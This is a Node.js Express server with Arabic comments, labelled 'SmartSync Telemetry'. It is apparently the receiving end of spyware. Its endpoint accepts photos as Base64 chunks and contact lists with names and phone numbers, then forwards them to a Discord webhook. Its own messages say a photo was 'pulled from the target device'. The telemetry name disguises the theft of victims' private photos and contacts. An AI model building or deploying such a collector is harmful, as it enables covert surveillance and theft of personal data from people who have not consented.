const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// زيادة الحجم المسموح لاستقبال صور Base64 الكبيرة
app.use(express.json({ limit: '15mb' }));

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

async function retryWithBackoff(fn, retries = 3, delay = 1000) {
    try {
        return await fn();
    } catch (error) {
        if (retries <= 0) throw error;
        console.warn(`⚠️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, delay));
        return retryWithBackoff(fn, retries - 1, delay * 2);
    }
}

app.post('/api/telemetry', async (req, res) => {
    try {
        const body = req.body;

        if (!body || (Array.isArray(body) && body.length === 0) || Object.keys(body).length === 0) {
            return res.status(400).json({ error: 'Payload is empty or invalid JSON.' });
        }

        let discordPayload = {};

        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها بشكل احترافي
        if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
            const base64Length = body[0].photo_chunk.length;
            discordPayload = {
                content: `📸 **تم استلام وتأكيد سحب صورة جديدة بدقة عالية من الجهاز المستهدف!**`,
                embeds: [
                    {
                        title: `🖼️ معاينة الصورة المستخرجة (Asset ID: ${body[0].asset_id || 'N/A'})`,
                        color: 3066993,
                        description: `تم تلقي حزمة البيانات البصرية بنجاح تام.\n- **حجم البيانات المعالجة:** \`${base64Length} بايت\`\n- **الحالة:** مُستخرجة وخالية من التكرار.\n- **الوقت:** \`${new Date().toLocaleString()}\``,
                        footer: { text: 'SmartSync Telemetry - Photo Module' }
                    }
                ]
            };
        } 
        // 2. معالجة جهات الاتصال
        else if (Array.isArray(body)) {
            let descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '...';

            discordPayload = {
                embeds: [
                    {
                        title: `👥 تقرير مزامنة جهات الاتصال الفريدة (${body.length} عنصر)`,
                        color: 3066993,
                        description: descriptionText,
                        footer: { text: 'SmartSync Telemetry - Contacts Module' }
                    }
                ]
            };
        } 
        // 3. بيانات عامة
        else {
            discordPayload = {
                embeds: [
                    {
                        title: `📊 تقرير تشخيص عام`,
                        color: 3066993,
                        description: `\`\`\`json\n${JSON.stringify(body, null, 2).substring(0, 1900)}\`\`\``,
                        footer: { text: 'SmartSync Telemetry' }
                    }
                ]
            };
        }

        if (DISCORD_WEBHOOK_URL) {
            await retryWithBackoff(
                () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
                3,
                1000
            );
        } else {
            console.warn('DISCORD_WEBHOOK_URL is not set in environment variables.');
        }

        return res.status(200).json({ success: true, message: 'Telemetry processed and sent to Discord.' });

    } catch (error) {
        console.error('❌ فشل إرسال التقرير إلى ديسكورد:', error.message);
        return res.status(500).json({ 
            success: false, 
            error: 'Internal Server Error while processing telemetry after retries.',
            details: error.message 
        });
    }
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'UP', service: 'telemetry-webhook-service' });
});

app.listen(PORT, () => {
    console.log(`Telemetry microservice is running on port ${PORT}`);
});
